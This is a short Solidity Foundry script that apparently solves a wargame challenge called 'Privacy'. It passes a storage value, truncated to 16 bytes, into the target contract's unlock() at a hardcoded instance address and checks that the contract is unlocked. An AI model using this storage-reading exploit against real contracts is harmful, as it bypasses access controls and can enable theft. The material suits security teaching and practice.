// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "src/Privacy.sol";

contract Solve is Script {
    Privacy privacy;
    
    address constant INSTANCE_ADDR = 0x781Ed6302712F63EE4F3541DDe074302A42Aa073;
    bytes32 data = 0x5e075ed5f50a45d0b2ea4c26b18980794fbccdfe398b3eb0f992a6465e6fd6d5;
    
    function run() external {
        privacy = Privacy(INSTANCE_ADDR);
        
        vm.startBroadcast();
        privacy.unlock(bytes16(data));
        vm.stopBroadcast();

        require(!privacy.locked());
    }
}